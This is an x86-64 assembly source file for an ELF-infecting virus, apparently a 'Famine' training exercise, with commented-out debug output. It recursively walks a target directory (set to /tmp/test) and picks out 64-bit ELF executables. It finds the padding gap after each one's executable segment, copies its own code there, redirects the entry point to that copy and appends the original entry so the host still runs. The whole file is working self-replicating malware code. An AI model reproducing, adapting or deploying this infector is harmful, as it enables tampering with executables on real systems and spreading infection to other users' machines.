
%include "famine.inc"

_starting:
bits 64
section .text
default rel
global main
extern printf

	_exit:
	; === Exit without error ===
	mov rax, SYS_EXIT
	mov rdi, 42
	syscall

main:
	_start:
	; === Placing our 'famine' struct on the stack ===
	mov rbp, rsp
	push rbp
	mov rbp, rsp
	sub rsp, famine_size
	mov rdi, VIRUS_SIZE
	mov FAM(famine.payload_size), rdi
;	write_format payload_sz, FAM(famine.payload_size)

	mov rdi, target_dir
	call _traverse_dirs
	mov rax, _start
	add rax, VIRUS_SIZE
	sub rax, 0xc
	mov qword rax, [rax]
	cmp rax, 0
	je _exit
	jmp rax


; ##### LOOP THROUGH TARGET DIRECTORIES #####

_traverse_dirs:
	; === chdir(dirpath) && open(".", O_RDONLY, 0) ===
	mov rax, 0x50
	syscall
	cmp rax, 0
	jl _return
	mov rax, SYS_OPEN
	mov rdi, curr_dir
	mov rsi, O_RDONLY
	xor rdx, rdx
	syscall
	cmp rax, 0
	jl _return

	; === getdents(dir_fd, struc linux_dirent *dirp, count) ===
	mov rdi, rax												; rax has the fd of the "open" call
	sub rsp, DIRENTS_BUFF_SIZE									; Making space on the stack for our dirent array
	mov rsi, rsp												; pointing 2nd argument of getents to the space on the stack
	sub rsp, dirent_wrapper_size								; Making space for the wrapper that will contain total_dreclen
	mov qword [rsp + dirent_wrapper.total_dreclen], 0			; Initializing dreclen to 0
	mov rdx, DIRENTS_BUFF_SIZE
	mov rax, SYS_GETENTS
	syscall
	cmp rax, 0
	jl _exit_dir_loop

	; === Beginning of the loop iterating through files of directory ===
	_list_dir:
		xor r14, r14											; r14 stores d_reclen
		lea r15, [rsp + dirent_wrapper_size]					; r15 used to navigate current dirent, and ultimatly store d_name
		add r15, [rsp + dirent_wrapper.total_dreclen]			; bring r15 to our current dirent (start of dirent array + total d_reclen browsed until now)
		mov r13, r15											; r13 will store d_type of current dirent
		add r15, D_RECLEN_OFF									; bring r15 to the offset at which d_reclen is located
		mov r14w, word [r15]									; mov d_reclen (pointed by r15) to r14
		cmp r14, 0												; if d_reclen is 0, we reached the end of the directories and we exit
		je _exit_dir_loop
		add r15, D_NAME_OFF - D_RECLEN_OFF						; bring r15 to the offset of d_name
		add [rsp + dirent_wrapper.total_dreclen], r14			; keep track of the total d_reclen
		sub r14, 1
		add r13, r14											; we're adding d_reclen - 1 to r13 in order to bring it to the d_type offset
		movzx r13, byte [r13]									; r13 has d_type value

		mov rdi, r15											; we move the filename to rdi
		cmp r13, 0x8											; r13 has d_type. If type is 0x8 (regular file), handle the file
		je _handle_file
		cmp r13, 0x4											; If type is 0x4 (directory), handle the directory
		je _handle_dir
		jmp _list_dir											; In all other cases, do nothing with the file			





; ##### FILE INFECTION #####

_file:
	; === open(filename, O_RDWR, 0) | (path must be in rdi) ===
	mov rax, SYS_OPEN
	mov rsi, O_RDWR
	xor rdx, rdx
	syscall
	mov FAM(famine.fd), rax										; Saving the file fd in famine.fd
	cmp rax, 0													; Error checking (open failed)
	jl _not_valid_x64

	; === Calculate the size of the file with lseek ===
	mov rdi, rax
	mov rsi, 0
	mov rdx, 2
	mov rax, SYS_LSEEK
	syscall
	mov FAM(famine.fsize), rax									; Saving the file size in famine.fsize
	cmp rax, 4													; Error checking (file too small)
	jl _not_valid_x64

	; === mmap(0, famine.fsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0) ===
	mov rdi, 0
	mov rsi, FAM(famine.fsize)
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_SHARED
	mov r8, FAM(famine.fd)
	mov r9, 0
	mov rax, 9
	syscall
	mov FAM(famine.map_ptr), rax								; Saving mapped file pointer in famine.map_ptr
	cmp rax, 0													; Error checking (mmap failed)
	jl _not_valid_x64

	; === Closing the fd ===
	mov rax, SYS_CLOSE
	mov rdi, FAM(famine.fd)
	syscall

	; === Making sure the file is an ELF file ===
	mov rax, FAM(famine.map_ptr)
	mov dword eax, [rax]
	cmp eax, 0x464c457f											; Magic bytes characterising an ELF file
	jne _not_valid_x64

	; === Making sure the ELF file is x64 ===
	mov rax, FAM(famine.map_ptr)
	add rax, 0x4
	movzx rax, byte [rax]
	cmp rax, 0x2
	jne _not_valid_x64
;	write_format string, info_1

	; === Getting the segments offset in file ===
	mov rax, FAM(famine.map_ptr)
	add rax, elf64_ehdr.e_phoff
;	write_format phoff, [rax]

	; === Finding the text segment in file ===
	mov r15, [rax]												; Storing e_phoff in r15
	mov r14, FAM(famine.map_ptr)
	add r14, elf64_ehdr.e_phnum
	movzx r14, word [r14]										; Storing e_phnum in r14
;	write_format phnum, r14

	dec r14														; Decrementing by 1 since our counter starts at 0
	mov rax, FAM(famine.map_ptr)
	add rax, r15												; rax is now at the start of segment headers in file
	xor r13, r13												; Used to loop through all segment headers
	_phnum_loop:
		call _is_text_segment
		cmp r14, r13
		je _list_dir											; We iterated through all segment headers and didnt find the text segment. Give up for this file
		add rax, elf64_phdr_size
		inc r13
		jmp _phnum_loop
	_found_text_segment:
		add rax, elf64_phdr.p_offset
		mov rdi, [rax]
		mov FAM(famine.txt_offset), rdi
;		write_format text_seg, FAM(famine.txt_offset)

		add rax, elf64_phdr.p_vaddr - elf64_phdr.p_offset
		mov rdi, [rax]
		mov FAM(famine.txt_vaddr), rdi

		add rax, elf64_phdr.p_filesz - elf64_phdr.p_vaddr
		mov rdi, [rax]
		mov FAM(famine.txt_filesz), rdi
;		write_format filesz, FAM(famine.txt_filesz)

		add rax, elf64_phdr_size - (elf64_phdr.p_filesz - elf64_phdr.p_offset)
		mov rdi, [rax]
		mov FAM(famine.next_offset), rdi
;		write_format next_seg, FAM(famine.next_offset)

	; === Calculating the space available in padding gap ===
	mov rsi, FAM(famine.next_offset)
	mov rdi, FAM(famine.txt_offset)
	add rdi, FAM(famine.txt_filesz)
	sub rsi, rdi
	mov FAM(famine.gap_size), rsi
;	write_format gap_sz, FAM(famine.gap_size)

	; === Comparing gap size and virus size ===
	mov rdi, FAM(famine.payload_size)
	cmp rdi, rsi
	jg _not_enough_space
;	write_string enough_sp, 27

	; === Patch ELF entry point ===
	mov rax, FAM(famine.map_ptr)
	add rax, elf64_ehdr.e_entry
	mov rsi, [rax]
	mov FAM(famine.orig_entry), rsi
;	write_format entry, FAM(famine.orig_entry)
	mov rdi, FAM(famine.txt_vaddr)
	add rdi, FAM(famine.txt_filesz)
	mov [rax], rdi
;	write_format entry, [rax]
	
	; === Writing virus from injection point ===
	mov rdi, FAM(famine.map_ptr)
	add rdi, FAM(famine.txt_offset)
	add rdi, FAM(famine.txt_filesz)								; RDI at injection point
	mov rsi, _start												; RSI at start of virus
	mov rcx, VIRUS_SIZE											; Copy whole virus to injection point [faire un -4 ici et ajouter manuellement entry point ?]
	repnz movsb
	lea rsi, FAM(famine.orig_entry)
	mov rcx, 0x8
	repnz movsb													; Copy host entry point



	jmp _list_dir




_is_text_segment:
	mov rsi, rax												; rax has the address of p_type
	cmp dword [rsi], 0x1										; |
	jne _return													; |	--> If the segment type isn't PT_LOAD, this isn't the text segment  
	add rsi, elf64_phdr.p_flags
	mov rsi, [rsi]
	and rsi, 0x1												; |
	cmp rsi, 0x0												; | --> If the segment hasn't the flag PF_X (executable), this isn't the text segment
	je _return													; |
	pop rdi
	jmp _found_text_segment



_not_valid_x64:
	; === Stop handling file after error ; silently continue _list_dir loop ===
;	write_format string, file_error
	jmp _list_dir

_not_enough_space:
;	write_format string, file_error
	jmp _list_dir

_return:
	ret


; ##### UTILITY FUNCTIONS FOR LOOPING THROUGH TARGET DIRECTORIES #####

_handle_dir:
	call _iterable_dir
	cmp rax, 0x0
	je n_iter
	iter:
;		write_format directory_i, r15
		jmp _list_dir
	n_iter:
;		write_format directory_n, r15
		jmp _list_dir

_handle_file:
;	write_format file, r15
	jmp _file

_iterable_dir:
	cmp byte [rdi], 0x2e	; rdi has directory name.
	jne iterable			; |
	inc rdi					; |
	cmp byte [rdi], 0x0		; |
	je non_iterable			; |
	cmp byte [rdi], 0x2e	; |		--> If the directory name is '.' or '..', consider it non-iterable for recursion
	jne iterable			; |
	inc rdi					; |
	cmp byte [rdi], 0x0		; |
	je non_iterable			; |
	iterable:
		mov al, 0x1
		movzx rax, al
		ret
	non_iterable:
		mov al, 0x0
		movzx rax, al
		ret

_exit_dir_loop:
	add rsp, DIRENTS_BUFF_SIZE
	add rsp, dirent_wrapper_size
	ret


target_dir	db		"/tmp/test",0x0
curr_dir	db		".",0x0
fname		db		"./test/sample",0x0
debug		db		"Hi",0x0a,0x0
file_error	db		"Not a valid ELF x64 file",0x0

string		db		"[*] %s",0x0a,0x0
num			db		"[*] %d",0x0a,0x0
hex			db		"[*] 0x%x",0x0a,0x0
pointer		db		"[*] %p",0x0a,0x0
char		db		"[*] %c",0x0a,0x0

info_1		db		"Valid ELF x64 file",0x0

directory_n	db		0x0a,"[*] DIRECTORY (non-iterable) : %s",0x0a,0x0
directory_i	db		0x0a,"[*] DIRECTORY (iterable) : %s",0x0a,0x0
file		db		0x0a,"[*] FILE : %s",0x0a,"--> Starting handling file '%1$s'",0x0a,0x0
phoff		db		"[*] phoff is %d",0x0a,0x0
phnum		db		"[*] phnum is %d",0x0a,0x0
text_seg	db		"[*] Text segment at offset 0x%016x",0x0a,0x0
next_seg	db		"[*] Next segment at offset 0x%016x",0x0a,0x0
filesz		db		"[*] p_filesz of segment is %d",0x0a,0x0
gap_sz		db		"[*] Gap size is %d bytes",0x0a,0x0
payload_sz	db		"[*] Payload size is %d bytes",0x0a,0x0
enough_sp	db		"[*] Enough space to inject",0x0a,0x0
entry		db		"[*] Entry point of elf is %p",0x0a,0x0
h_e			db		"[!] Host entry point is %d",0x0a,0x0
_finish:
host_entry	dq		0
